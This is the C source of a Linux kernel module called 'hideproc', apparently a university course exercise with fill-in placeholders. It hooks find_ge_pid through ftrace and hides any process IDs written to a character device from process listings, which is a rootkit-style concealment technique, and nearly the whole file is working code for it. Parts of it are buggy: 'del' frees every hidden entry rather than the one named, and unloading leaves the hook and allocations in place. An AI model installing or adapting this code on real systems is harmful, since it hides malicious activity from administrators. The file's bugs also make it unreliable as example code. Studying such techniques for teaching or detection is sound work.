#include <linux/cdev.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>

#define DEBUG

MODULE_LICENSE("GPL");
MODULE_AUTHOR("National Cheng Kung University, Taiwan");

enum RETURN_CODE { SUCCESS };


struct ftrace_hook {
    const char *name;
    void *func, *orig;
    unsigned long address;
    struct ftrace_ops ops;
};

static int hook_resolve_addr(struct ftrace_hook *hook)
{
    hook->address = &find_ge_pid;
#if 0
    if (!hook->address) {
        printk("unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    } else {
        printk("resolved symbol: %s %p\n", hook->name, *((unsigned long *) hook->address));

        printk("resolved symbol: schedule:%p\n", kallsyms_lookup_name("schedule"));
    }
#endif
        printk("resolved symbol: %s %p\n", hook->name, hook->address);
        printk("kallsym symbol: %p\n", kallsyms_lookup_name(hook->name));
    *((unsigned long *) hook->orig) = &find_ge_pid;
//    *((unsigned long *) hook->orig) = 0xffff8000100dc310;
    //hook->address = hook->orig;
    return 0;
}

static void notrace hook_ftrace_thunk(unsigned long ip,
                                      unsigned long parent_ip,
                                      struct ftrace_ops *ops,
                                      struct ftrace_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->regs.pc = (unsigned long) hook->func;
}

static int hook_install(struct ftrace_hook *hook)
{
    int err = hook_resolve_addr(hook);
    if (err)
        return err;

    hook->ops.func = hook_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION |
                      FTRACE_OPS_FL_IPMODIFY;


    err = ftrace_set_filter(&hook->ops, "find_ge_pid", strlen("find_ge_pid"), 0);
    if (err) {
        printk("ftrace_set_filter() failed: %d\n", err);
        return err;
    } else {
	    printk("successful \n");
	}

#if 0
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 1);
    if (err) {
        printk("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }
#endif


    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk("register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }
    return 0;
}

#if 1
void hook_remove(struct ftrace_hook *hook)
{
    int err = unregister_ftrace_function(&hook->ops);
    if (err)
        printk("unregister_ftrace_function() failed: %d\n", err);
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        printk("ftrace_set_filter_ip() failed: %d\n", err);
}
#endif

typedef struct {
    pid_t id;
    struct list_head list_node;
} pid_node_t;

LIST_HEAD(hidden_proc);

typedef struct pid *(*find_ge_pid_func)(int nr, struct pid_namespace *ns);
static find_ge_pid_func real_find_ge_pid;

static struct ftrace_hook hook;

static bool is_hidden_proc(pid_t pid)
{
    pid_node_t *proc, *tmp_proc;
    //AAA 
    list_for_each_entry(proc, &hidden_proc, list_node) {
        if (proc->id == pid)
            return true;
    }
    return false;
}

static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
{
    struct pid *pid = real_find_ge_pid(nr, ns);
    while (pid && is_hidden_proc(pid->numbers->nr))
        pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
    return pid;
}

static void init_hook(void)
{
    real_find_ge_pid = (find_ge_pid_func) kallsyms_lookup_name("find_ge_pid");
    hook.name = "find_ge_pid";
    hook.func = hook_find_ge_pid;
    hook.orig = &real_find_ge_pid;
    hook_install(&hook);
}

static int hide_process(pid_t pid)
{
    pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
    proc->id = pid;
    //CCC;
    list_add(&proc->list_node,&hidden_proc);
    return SUCCESS;
}

static int unhide_process(pid_t pid)
{
    pid_node_t *proc, *tmp_proc;
    //BBB 
    list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
        //DDD;
	list_del_init(&proc->list_node);
        kfree(proc);
    }
    return SUCCESS;
}

#define OUTPUT_BUFFER_FORMAT "pid: %4d\n"
#define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 4)
#define MAX_WRITE_BUFFER_SIZE 1024

static int device_open(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static int device_close(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static ssize_t device_read(struct file *filep,
                           char *buffer,
                           size_t len,
                           loff_t *offset)
{
    pid_node_t *proc, *tmp_proc;
    char message[MAX_MESSAGE_SIZE];
    if (*offset)
        return 0;

    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        memset(message, 0, MAX_MESSAGE_SIZE);
        snprintf(message, MAX_MESSAGE_SIZE, OUTPUT_BUFFER_FORMAT, proc->id);
        copy_to_user(buffer + *offset, message, strlen(message));
        *offset += strlen(message);
    }
    return *offset;
}

static ssize_t device_write(struct file *filep,
                            const char *buffer,
                            size_t len,
                            loff_t *offset)
{
    long pid;
    char *message;


    char add_message[] = "add", del_message[] = "del";
    if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
        return -EAGAIN;



    if (len >= MAX_WRITE_BUFFER_SIZE) {
	    printk("Too large to handle\n");
	    return -EINVAL;
    }

#ifdef DEBUG
    print_hex_dump_bytes(KERN_DEBUG, "input buffer", DUMP_PREFIX_ADDRESS, buffer, len);
#endif

    message = kmalloc(len + 1, GFP_KERNEL);
    memset(message, 0, len + 1);
    copy_from_user(message, buffer, len);


    char *p=message;
    char *q=strstr(p,"\n");

    while (p < message+len && q!= NULL) {
	    *q = '\0';

#ifdef DEBUG
    print_hex_dump_bytes(KERN_DEBUG,"partial string", DUMP_PREFIX_ADDRESS, p, q-p+1);
#endif

    if (!memcmp(p, add_message, sizeof(add_message) - 1)) {
        kstrtol(p+ sizeof(add_message), 10, &pid);
        hide_process(pid);
    } else if (!memcmp(p, del_message, sizeof(del_message) - 1)) {
        kstrtol(p+ sizeof(del_message), 10, &pid);
        unhide_process(pid);
    }
	    p = q+1;
	    q=strstr(p,"\n");
    }

    *offset = len;
    kfree(message);
    return len;

#if 0
    if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
        kstrtol(message + sizeof(add_message), 10, &pid);
        hide_process(pid);
    } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
        kstrtol(message + sizeof(del_message), 10, &pid);
        unhide_process(pid);
    } else {
        kfree(message);
        return -EAGAIN;
    }

    else {
        kfree(message);
        return -EAGAIN;
    }

#endif

}

static struct cdev cdev;
static struct class *hideproc_class = NULL;

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .release = device_close,
    .read = device_read,
    .write = device_write,
};

#define MINOR_VERSION 1
#define DEVICE_NAME "hideproc"


int dev_major;

static int _hideproc_init(void)
{
    int err, dev_major;
    dev_t dev;
    printk(KERN_INFO "@ %s\n", __func__);
    err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
    dev_major = MAJOR(dev);

    hideproc_class = class_create(THIS_MODULE, DEVICE_NAME);

    cdev_init(&cdev, &fops);
    cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1);
    device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL,
                  DEVICE_NAME);

    init_hook();

    return 0;
}

static void _hideproc_exit(void)
{

	
    device_destroy(hideproc_class,MKDEV(dev_major, MINOR_VERSION)); 
    printk(KERN_INFO "@ %s\n", __func__);



    /* FIXME: ensure the release of all allocated resources */
}

module_init(_hideproc_init);
module_exit(_hideproc_exit);
